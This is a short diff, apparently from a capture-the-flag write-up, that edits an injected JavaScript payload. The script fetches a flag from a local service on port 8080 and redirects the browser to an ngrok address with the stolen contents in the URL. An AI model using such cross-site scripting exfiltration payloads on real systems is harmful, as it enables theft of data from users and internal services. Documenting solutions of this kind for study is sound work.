@@ -34,7 +34,7 @@
 
 ```js
 <script>
-fetch("http://127.0.0.1:8080/flag").then(r=>r.text()).then((r)=>{location="http://1659bf86e1d6.ngrok.io/?c="+r})
+fetch("http://0.0.0.0:8080/flag").then(r=>r.text()).then((r)=>{location="http://1659bf86e1d6.ngrok.io/?c="+r})
 </script>
 ```
 
